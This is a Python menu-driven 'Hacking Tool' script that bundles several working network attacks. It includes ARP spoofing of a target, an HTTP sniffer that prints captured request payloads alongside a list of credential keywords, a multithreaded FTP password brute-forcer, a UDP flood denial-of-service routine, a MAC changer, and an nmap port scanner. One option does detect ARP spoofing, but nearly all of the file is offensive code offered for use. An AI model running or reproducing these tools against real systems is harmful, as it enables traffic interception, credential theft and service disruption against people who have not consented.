import subprocess
import optparse
import scapy.all as scapy
from scapy.layers import http
import time 
from ip_checker import ipchecker
import ftplib
from threading import Thread
import queue
from colorama import Fore, init 
import os
import sys
import nmap
import time
import socket
import random
from socket import timeout
from scapy.all import *
subprocess.call('clear', shell=True)

option_list = ("""
========================================
            Hacking Tool
========================================
1)  [+] IP Checker
2)  [+] website IP Checker
3)  [+] Port Scanner 
4)  [+] Arp Spoffing
5)  [+] Packet Sniffing
6)  [+] Arp spoffing detection
7)  [+] Brute Force to ftp(21)
8)  [+] Monitor Mode on
9)  [+] Monitor Mode off
10) [+] Dos Attack
11) [+] Mac Changer
12) [+] Exit
13) [+] Show Options
========================================
========================================
""")
print(option_list)

while(True):
    user_input = int(input("Main menu: "))
    if user_input == 1:
        print('*'*50)
        print("System IP Checker")
        print('*'*50)        
        def ipchecker():
            return subprocess.call('ifconfig', shell=True)
        print(ipchecker())
    
    if user_input == 2:
        print('*'*50)
        print("Don't include http://, https://, Only type www.example.com or example.com")
        print('*'*50)
        url= input("Enter url: ")
        ip = socket.gethostbyname(url)
        print("IP: ", ip)

    if user_input == 3:
        print('*'*50)
        print("Port Scanner")
        print('*'*50)
        nmScan = nmap.PortScanner()
        # scan localhost for ports in range 21-443
        ip = input("Enter Target ip: ")
        portnumber = input("Enter port number or port range like this 21-1000: ")
        nmScan.scan(ip, portnumber)

# run a loop to print all the found result about the ports
        for host in nmScan.all_hosts():
            print('Host : %s (%s)' % (host, nmScan[host].hostname()))
            print('State : %s' % nmScan[host].state())
            for proto in nmScan[host].all_protocols():
                print('----------')
                print('Protocol : %s' % proto)
 
                lport = nmScan[host][proto].keys()
                sorted(lport)
                for port in lport:
                    print('port : %s\tstate : %s' % (port, nmScan[host][proto][port]['state']))

    if user_input == 4:
        print('*'*50)
        print("ARP Spoofing")
        print('*'*50)
        op=1 # Op code 1 for ARP requests
        victim=input('Enter the target IP: ') #person IP to attack
        victim=victim.replace(" ","")
	
        spoof=input('Enter the routers IP: ')
        spoof=spoof.replace(" ","")
	
        mac=input('Enter the target MAC to hack: ') #mac of the victim
        mac=mac.replace("-",":")
        mac=mac.replace(" ","")
	
        arp=ARP(op=op,psrc=spoof,pdst=victim,hwdst=mac)
	
        while(True):
            try:
                send(arp)
                time.sleep(2)
            except KeyboardInterrupt:
                print("Restore ARP Table")
                time.sleep(4)
                exit()
        

    if user_input == 5:
        print('*'*50)
        print("Packet Sniffer")
        print('*'*50)
        def sniff(interface):
            scapy.sniff(iface=interface, prn=process)


        def process(packet):
            if packet.haslayer(http.HTTPRequest):
                url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
                print(url)
                if packet.haslayer(scapy.Raw):
                    load = packet[scapy.Raw].load
                    keyword = ["uid", "password", "pass", "uid", "username", "login"]
                    for keywords in keyword:
                        print(load)
                        break
                
        sniff("eth0")

    if user_input == 6:
        print('*'*50)
        print("arp spoofing detection")
        print('*'*50)
        def get_mac(ip):
            arp_request = scapy.ARP(pdst=ip)
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast/arp_request
            answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
            return answered_list[0][1].hwsrc

        def sniff(interface):
            scapy.sniff(iface=interface, store=False, prn=process_sniff_packet)

        def process_sniff_packet(packet):
            if packet.haslayer(scapy.ARP) and packet[scapy.ARP].op == 2:
                try:
                    real_mac = get_mac(packet[scapy.ARP].psrc)
                    response_mac = packet[scapy.ARP].hwsrc

                    if real_mac != response_mac:
                        print("[+] You are under attack !!!")

                except IndexError:
                    pass

        sniff("wlan0")

    if user_input == 7:
        print('*'*50)
        print("Brute Force to ftp(21)")
        print('*'*50)
        q = queue.Queue()
        n_threads = 30
        host = input("Enter Host IP: ")
        user = input("Enter User name: ")
        port = 21

        def connect_ftp():
            global q
            while True:
                password = q.get()
                server = ftplib.FTP()
                print("[!] Trying", password)
                try:
                    server.connect(host, port, timeout=5)
                    server.login(user, password)
                except ftplib.error_perm:
                    pass
                else:
                    print(f"{Fore.GREEN}[+] Found credentials: ")
                    print(f"\tHost: {host}")
                    print(f"\tUser: {user}")
                    print(f"\tPassword: {password}{Fore.RESET}") # 
                    with q.mutex:
                        q.queue.clear()
                        q.all_tasks_done.notify_all()
                        q.unfinished_tasks = 0
                finally:
                    q.task_done()
                    break

        passwords = open("wordlist.txt").read().split("\n")
        print("[+] Passwords to try:", len(passwords))
        for password in passwords:
            q.put(password)
        for t in range(n_threads):
            thread = Thread(target=connect_ftp)
            thread.daemon = True
            thread.start()
        q.join()

    if user_input == 8:
        print('*'*50)
        print("Monitor Mode On")
        print('*'*50)
        interface = input("Enter type your interface: ")

        try:
            subprocess.call('ifconfig ' +interface+ ' down', shell=True)
            subprocess.call('iwconfig ' +interface+ ' mode'+ ' monitor', shell=True)
            subprocess.call('ifconfig ' +interface+ ' up', shell=True)
            print("Monitor mode start")

        except:
            print("Check your Interface or try again")

    if user_input == 9:
        print('*'*50)
        print("Monitor Mode Off")
        print('*'*50)
        interface = input("Enter type your interface: ")

        try:
            subprocess.call('ifconfig ' +interface+ ' down', shell=True)
            subprocess.call('iwconfig ' +interface+ ' mode'+ ' managed', shell=True)
            subprocess.call('ifconfig ' +interface+ ' up', shell=True)
            print("Managed mode start")

        except:
            print("Check your Interface or try again")

    if user_input == 10:
        
        def dos(ip, port, dur, timeout):
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            bytes = random._urandom(1024)
            send = 1

            while True:
                try:
                    if time.time() > timeout:
                        break
                    else:
                        pass
                    sock.sendto(bytes, (ip, port))
                    send = send + 1
                    print("Sent %s packets to %s through port %s" % (send, ip, port))
                except KeyboardInterrupt:
                    os.system('clear')
                    break
    
            return 
        print('*'*50)
        print("Welcome to DOS Tool")
        print('*'*50)
        print(" ")
        ip = input("Enter Target ip: ")
        port = int(input("Enter Port no: "))
        dur = int(input("Enter Time Duration: "))
        timeout = time.time() + dur

        dos(ip, port, dur, timeout)


    if user_input == 11:
        print('*'*50)
        print("Mac address Changer")
        print('*'*50)
        def mac_changer(interface, new_mac):
            try:
                print("[+] Changing mac address to", new_mac)
                subprocess.call(['ifconfig', interface, 'down'])
                subprocess.call(['ifconfig', interface, 'hw', 'ether', new_mac])
                subprocess.call(['ifconfig', interface, 'up'])
    
            except:
                print("Could n't change New Address Try Again")

        interface = input("Enter your Interface Name: ")
        new_mac = input("Enter New Mac Address: ")
        if not interface:
            print("Can't leave it blank")
        elif not new_mac:
            print("Can't leave it blank")
        else:
            mac_changer(interface, new_mac)

    if user_input == 12:
        print('*'*50)
        print("Thanks for using this Script")
        print('*'*50)
        subprocess.call("clear", shell=True)
        exit()

    if user_input == 13:
        subprocess.call("clear", shell=True)
        print(option_list)
